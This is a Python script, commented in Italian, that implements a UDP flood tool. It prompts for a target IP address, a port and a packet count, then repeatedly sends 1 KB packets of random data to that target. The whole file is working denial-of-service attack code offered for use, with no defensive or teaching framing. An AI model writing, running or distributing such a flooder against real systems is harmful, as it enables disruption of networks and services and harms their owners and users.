# Importazione dei moduli necessari
import socket         # Modulo per creare socket di rete
import ipaddress      # Modulo per la validazione degli indirizzi IP
import random         # Modulo per generare byte casuali

# Definizione della funzione udp_flood per inviare pacchetti UDP
def udp_flood(target_ip, target_port, num_packets):
    try:
        # Crea un socket UDP
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # Crea un pacchetto di 1 KB (1024 byte) con dati casuali
        # Utilizziamo bytearray per generare una sequenza di byte casuali
        data = bytearray(random.getrandbits(8) for _ in range(1024))

        # Ciclo per inviare il numero di pacchetti specificato dall'utente
        for i in range(num_packets):
            udp_socket.sendto(data, (target_ip, target_port))
            print(f"Pacchetto {i + 1} inviato a {target_ip}:{target_port}")

        # Messaggio di completamento
        print("Invio dei pacchetti completato con successo.")

    # Gestione degli errori generici
    except Exception as e:
        print("Si è verificato un errore durante l'invio dei pacchetti:", e)

    # Chiusura del socket indipendentemente dal risultato
    finally:
        if udp_socket:
            udp_socket.close()

# Blocco principale che viene eseguito solo se il file viene eseguito direttamente
if __name__ == "__main__":
    try:
        # Richiesta all'utente di inserire l'IP target
        target_ip = input("Inserisci l'IP target: ")

        # Validazione dell'indirizzo IP inserito
        try:
            ipaddress.ip_address(target_ip)
        except ValueError:
            print("Errore: IP non valido.")
            exit(1)

        # Richiesta all'utente di inserire la porta UDP target
        target_port = int(input("Inserisci la porta UDP target (1-65535): "))

        # Validazione della porta inserita
        if not (1 <= target_port <= 65535):
            print("Errore: la porta deve essere compresa tra 1 e 65535.")
            exit(1)

        # Richiesta all'utente di inserire il numero di pacchetti da inviare
        num_packets = int(input("Inserisci il numero di pacchetti da inviare: "))

        # Validazione del numero di pacchetti
        if num_packets <= 0:
            print("Errore: il numero di pacchetti deve essere positivo.")
            exit(1)

        # Chiamata alla funzione udp_flood per inviare i pacchetti
        udp_flood(target_ip, target_port, num_packets)

    # Gestione dell'errore nel caso l'utente inserisca un valore non numerico
    except ValueError:
        print("Errore: input non valido.")